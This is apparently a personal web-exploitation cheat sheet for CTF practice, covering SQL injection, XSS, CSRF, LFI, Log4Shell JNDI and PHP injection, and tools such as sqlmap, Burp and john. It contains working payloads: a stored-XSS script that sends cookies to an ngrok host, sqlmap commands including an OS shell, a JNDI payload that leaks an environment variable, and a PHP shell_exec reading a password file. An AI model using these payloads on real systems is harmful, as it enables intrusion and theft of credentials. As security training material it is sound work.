`Open Web Application Security Project [OWASP]` Documentation on the top 10 critical security risk of web application

Injection :
- Context can be : HTML, JavaScript, JSON, SQL
- Special character sequences in user inputs can trigger an action in the context
Injection protection :
- Refuse characters you do not want
- Escape (encode) specila characters when you use them
Direct object reference : When a user-submitted parameters is a direct reference to a resource, a user may try to change it to access other resources

# Vulnerability detection

Injection detection : [Commix](https://github.com/commixproject/commix)

Overall detection : [Racoon](https://github.com/evyatarmeged/Raccoon), [w3af](https://github.com/andresriancho/w3af)

`WhatWeb` and `Wappalizer` identify website tech stack

[ExploitDB](https://www.exploit-db.com/)

[Vulnerabilities list](https://security.snyk.io/vuln)

## Content Security Policy [CSP]

`CSP` defines allowed domains for script, files, ... It is found in the response header.

[Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)


# Injection

Get notified when your payload triggers your personal canary:
[](https://canarytokens.org/generate#)

## SQL

SQL injection with filter: 
```sql
username: adm'||'in -> concatenation to dodge word 'admin' being blocked
password: ' glob '* -> add to the end of password to make it match any pattern
```

### SQLmap

Automate dumping tables or accessing hidden data thorugh SQL injection

```url
// Simple usage
sqlmap -u “http://target_server/”

// Specify target DBMS to MySQL
sqlmap -u “http://target_server/” --dbms=mysql

// Using a proxy
sqlmap -u “http://target_server/” --proxy=http://proxy_address:port

// Specify param1 to exploit
sqlmap -u “http://target_server/param1=value1&param2=value2” -p param1

// Use POST requests
sqlmap -u “http://target_server” --data=param1=value1&param2=value2

// Access with authenticated session
sqlmap -u “http://target_server” --data=param1=value1&param2=value2 -p param1 cookie=’my_cookie_value’

// Basic authentication
sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password

// Evaluating response strings
sqlmap -u “http://target_server/” --string=”This string if query is TRUE”
sqlmap -u “http://target_server/” --not-string=”This string if query is FALSE”

// List databases
sqlmap -u “http://target_server/” --dbs

// List tables of database target_DB
sqlmap -u “http://target_server/” -D target_DB --tables

// Dump table target_Table of database target_DB
sqlmap -u “http://target_server/” -D target_DB -T target_Table -dump

// List columns of table target_Table of database target_DB
sqlmap -u “http://target_server/” -D target_DB -T target_Table --columns

// Scan through TOR
sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5

// Get OS Shell
sqlmap -u “http://target_server/” --os-shell
```

### Protection

`Prepared statements` mean the database pre-compiles SQL code and stores the results, separating it from data

INSERT INTO products (name, price) VALUES (?, ?);

## Protection

- Refuse characters you do not want
- Escape (encode) special characters when you use them


## Cross Site Request Forgery

The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an <img> tag or an <iframe> where references to external resources are unverified.

```html
// Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in.
// If they transfer some money, the URL that is sent to the server might have the pattern:

http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS]

// Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include
// an image tag of 0 by 0 pixels which will automatically be requested by the browser such as:

<img src="http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS]" width="0" height="0" border="0">
```

## Server Side Request Forgery

`Server Side Request Forgery [SSRF]` attacker is able to cause a web application to send a request that the attacker defines.

## AJAX

```html
// AJAX payload
<script>
  const xhttp = new XMLHttpRequest()
  xhttp.onload = function() {
    document.getElementById("result").innerHTML = this.responseText
  }
  xhttp.open("GET", "../hello.txt")
  xhttp.send()
</script>
```

# Paths

## Directory traversal | Local File Inclusion [LFI]

```php
<?php
    $page = $_GET['page']; // ../../../../../../../../etc/passwd
    include("/var/www/html/" . $page);
?>
```

[Common payloads](https://github.com/payloadbox/rfi-lfi-payload-list)

## Common hidden files

`Gobuster` brute force common files with unintended data on the server

```bash
gobuster dir -u <url> -w <paths_list_file>
```

## Directory indexing

Use URL as path to display list of files in folder

# HTTP

## Verb Tampering

If GET requests are forbidden through hard-code, use HEAD or PATCH

## HTTP headers

- X-Forwarded-For: define origin IP (RFC1918)
- User-Agent: who is visiting
- Referer: where is the visitor coming from
- Date: when am I visiting
- DNT: Do Not track
- Accept-Language: what languages am I requiring and which is my prefered one

Google bot access:
```bash
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```

## CURL

Specify remote/local port number for TCP connection (instead of assigning it randomly)

```bash
curl --local-port ...
```

## Cross-Origin Resource Sharing [CORS]

When using another website's content in a website, if the Origin header of the request does not match the same domain, some conditions must be met:
- `Access-Control-Allow-Origin` header could specify accepted domains
- `Access-Control-Allow-Methods` header could specify accepted types of request
- `Access-Control-Max-Age` header could specify max valid cache age

## Parameter pollution

Repeat URL argument to override the first one and bypass safety checks

```
https://www.anybank.com/send/?from=accountA&to=accountB&amount=10000&from=accountC
```

# Cross-Site Scripting [XSS]

`Cross-Site Scripting [XSS]` vulnerability where a user of an application can send JavaScript that is executed by the browser of another user of the same application

`Request bin` temporary personal server to redirect XSS injections to : [Link](https://pipedream.com/requestbin)

[ngrok](https://github.com/inconshreveable/ngrok) : expose local server to anyone through an url

```bash
# log all data received on port
php -S localhost:5555

# open php server to url
ngrok http 5555
```

## Stored XSS

Upload malicious script to a database to be executed on load on other user's browsers

```html
<script>document.write('<img src="https://c1d4-185-25-194-148.ngrok.io?cmd='+document.cookie+'"width=0 height=0 border=0/>');</script>
```

## Reflected XSS

`Reflected XSS` when an XSS exploit is provided through a URL parameter

```html
https://ctf101.org?data=<script>alert(1)</script>
```

## Stored XSS

`Stored XSS` when an XSS exploit is possible inside the website itself by posting content on the website

## DOM XSS

`Document Object Model XSS [DOM XSS]` client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger

-> XSS can not be stopped by the server recognizing payloads

## Reverse shell

[Reverse shell payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

# Cookies

## Web tokens

[JWT encoder/decoder](https://irrte.ch/jwt-js-decode/index.html)

```bash
# brute force token (input is the full token)
john --format=HMAC-SHA512 --wordlist=rockyou.txt jwt.txt

# use token with curl
curl -X POST -H "Accept: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"  http://challenge01.root-me.org/web-serveur/ch59/admin
```

> **Famous**: set alg to none

# Tools

`Requests` Python library to automate sending and receiving online data

`Scapy` Python library to automate network capture modification

## Wireshark

Alternatives:
- Arkime
- Pkappa2
- Flower
- Tulip

[Similar website](https://apackets.com/)

```bash
// list visited HTTP websites
Statistics > HTTP > Load Distribution

// view transferred files
File > Export Objects

// search for images
Ctrl+F > IEND

// follow stream
Right click > Follow > <stream_type>
```

## Burp

`Repeater` allows retrying the same request with small modifications and viewing the result in details

### Intruder

`Intruder` allows bruteforcing a request parameter

Add $$ to the place where the payload sould be injected

Define payload in the `Payload` tab

# Vocabulary


`DNS over HTTPS [DoH]` protocol for performing remote Domain Name System (DNS) resolution via the HTTPS protocol

`Carriage Return Line Feed [CRLF]` 2 bytes sequence to end a line

# Brute force

`Hydra` brute force url/ssh/... logins


# Tomcat

[Management vulnerability scanner](https://github.com/p0dalirius/ApacheTomcatScanner)

# JNDI

[Explanation](https://blog.shiftleft.io/log4shell-jndi-injection-via-attackable-log4j-6bfea2b4896e)

JNDI-LDAP main payload:
```bash
${jndi:ldap://127.0.0.1/${env:FLAG}}
```

[Host exploit to redirect to](https://github.com/pimps/JNDI-Exploit-Kit)

[Useful payloads to bypass basic security](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words#10-polymorphic-json-rest-api-request)

[Automated tool](https://github.com/pimps/JNDI-Exploit-Kit)

# PHP Hypertext Preprocessor [PHP]

PHP can also be injected

```php
eval();
assert();
system();
exec();
shell_exec(); # run a command
passthru();
escapeshellcmd();
pcntl_exec();

# this is a comment
```

Example payload:
```php
<?
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output</pre>";
?>
```

Exploit `uniqid` in python:
```python
def uniqid(time, prefix='', more_entropy=False):
    """uniqid([prefix=''[, more_entropy=False]]) -> str
    Gets a prefixed unique identifier based on the current
    time in microseconds.

    prefix
        Can be useful, for instance, if you generate identifiers
        simultaneously on several hosts that might happen to generate
        the identifier at the same microsecond.
        With an empty prefix, the returned string will be 13 characters
        long. If more_entropy is True, it will be 23 characters.

    more_entropy
        If set to True, uniqid() will add additional entropy (using
        the combined linear congruential generator) at the end of
        the return value, which increases the likelihood that
        the result will be unique.

    Returns the unique identifier, as a string."""
    m = time
    sec = math.floor(m)
    usec = math.floor(1000000 * (m - sec))
    if more_entropy:
        lcg = random.random()
        the_uniqid = "%08x%05x%.8F" % (sec, usec, lcg * 10)
    else:
        the_uniqid = '%8x%05x' % (sec, usec)

    the_uniqid = prefix + the_uniqid
    return the_uniqid
```

## PHP quirks

[Comparison quirks](https://ctf101.org/web-exploitation/php/what-is-php/)

```php
$test1 = "d85d1d81b25614a3504a3d5601a9cb2e";
```
this string starts with a "d", which is not valid number, the var will resolve to 0

```php
$test2 = "3581169b064f71be1630b321d3ca318f";
```
this string starts with 3581169 which is a valid number, so the var will resolve to that value which is not equal to 0 

Bypass `strcmp`:
```python
url = "http://strcmp.tbsctf.fr/"
data = {
    'username': 'admin',
    'password[]': 'lol'
}
response = requests.post(url, data=data)
```

Get converted to 0 when cast to int:
```php
0.1728e8
```

`Parameter pollution` PHP takes last definition of parameter

## Common exploits

[302 OK reply](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf)

# JavaScript [JS]

[Comparison table](https://dorey.github.io/JavaScript-Equality-Table/)

## JS quirks

`startsWith` is case sensitive -> ez exploit

# Regular Expression [RegEx]

[RegExr](https://regexr.com/)

[Short explanation](https://www.youtube.com/watch?v=sXQxhojSdZM)

`RegEx` is an tool for finding patterns, used to validate or search through text

Write your expression between /.../

Operators:
- `|` logical OR
- `()` isolate group
    Example: /(Bob|Alice)Jones/g will look for every BobJones or AliceJones in text
- After a group or character:
    - `?` appears 0 or 1 times
    - `*` appears 0 or more times
    - `+` appears 1 or more times
    - `{a,b}` appears between a and b times
- `\` use special characters
- Character classes:
    - `\d` any digit
    - `\D` any NON digit
    - `\w` any letter character
    - `\s` spaces, tabs, newlines and Unicode spaces
    - `\0` null
    - `\n` new line
    - `\uXXXX` unicode character of code XXXX
- `.` match any character except \n
- `[A-Z]` custom character sets
- `[^LBC]` negative custom character sets
- `[^]` matches any character
- `^` matches the beginning of a line
- `$` matches the end of a line
- `\A` matches the beginning of the string
- `\z` matches the end of the string
- `\Z` matches the end of the string unless the string ends with a "\n", in which case it matches just before the "\n"

RegEx interpolation (Ruby):
```bash
https://www.acceis.fr -> /https:\/\/www.acceis.fr/
```

## Flags

You can add flags /.../<here> to modify the behaviour of your RegEx

- `g` global : search every occurence
- `i` case insensitive
- `m` multiline : matches the start and end of the entire string as well as the start and end of the line
- `s` single line 
- `u` unicode : enables support for unicode

Bypass `insensitive mode` : [](https://util.unicode.org/UnicodeJsps/list-unicodeset.jsp?a=%5B%3AtoCasefold%3Ds%3A%5D)


# Upload form

[Common attacks](https://www.acunetix.com/websitesecurity/upload-forms-threat/)

# Backup file

Add `~` to the end of url to download backup file 



TODO nuclei nikto
TODO php filter
